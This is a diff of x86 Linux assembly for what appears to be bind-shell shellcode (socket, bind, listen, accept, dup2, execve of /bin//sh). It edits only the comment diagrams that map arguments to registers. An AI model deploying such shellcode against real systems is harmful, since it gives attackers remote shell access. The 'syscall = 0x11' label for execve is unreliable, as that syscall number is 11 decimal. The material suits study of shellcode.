@@ -33,9 +33,9 @@ _start:
 socket:
 	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 	;   |      |           |            |
-	;   |      2           1            0
-	;  ebx     \           |            /
-	;           \________ esp _________/
+	;  0x01    2           1            0
+	;   |      \           |            /
+	;  ebx      \________ esp _________/
 	;                      |
 	;                     ecx
 	push SYS_SOCKETCALL    ; syscall 0x66
@@ -79,9 +79,9 @@ socket:
 bind:
 	; bind(sockfd, [AF_INET, PORT, INADDR_ANY], len(struct));
 	;   |      |   |                         |      |
-	;   |     edi  \__________ ecx __________/     0x10
-	;  ebx          \           |           /
-	;                \________ esp ________/
+	;  0x02   edi  \__________ ecx __________/     0x10
+	;   |           \           |           /
+	;  ebx           \________ esp ________/
 	;                           |
 	;                          ecx
 	push STRUCT_LEN         ; STRUCT_LEN = 0x10 (16 byte)
@@ -93,10 +93,10 @@ bind:
 
 listen:
 	; listen(sockfd, backlog);
-	;    |  |  |       |    |
-	;   ebx | edi      0    |
-	;       |          |    |
-	;       |         esi   |
+	;   |   |  |       |    |
+	;  0x04 | edi      0    |
+	;   |   |          |    |
+	;  ebx  |         esi   |
 	;       \_____ esp _____/
 	;               |
 	;              ecx
@@ -111,10 +111,10 @@ listen:
 
 accept:
 	; accept(sockfd, struct, len(struct));
-	;   |   |  |        |         |     |
-	;  0x5  | edi      NULL      NULL   |
-	;   |   |                           |
-	;  ebx  \___________ esp ___________/
+	;  |    |  |        |         |     |
+	; 0x05  | edi      NULL      NULL   |
+	;  |    |                           |
+	; ebx   \___________ esp ___________/
 	;                     |
 	;                    ecx
 	mov al, SYS_SOCKETCALL ; syscall 0x66
@@ -148,9 +148,9 @@ dup2:
 execve:
 	; execve("/bin//sh/", 0, 0);
 	;   |    |         |  |  |
-	;  eax   |         |  | edx
-	;        \__ esp __/ ecx
-	;             |
+	;  0x11  |         |  | edx
+	;   |    \__ esp __/ ecx
+	;  eax         |
 	;            ebx
 	push SYS_EXECVE        ; syscall = 0x11
 	pop eax                ; set SYS_EXECVE to eax
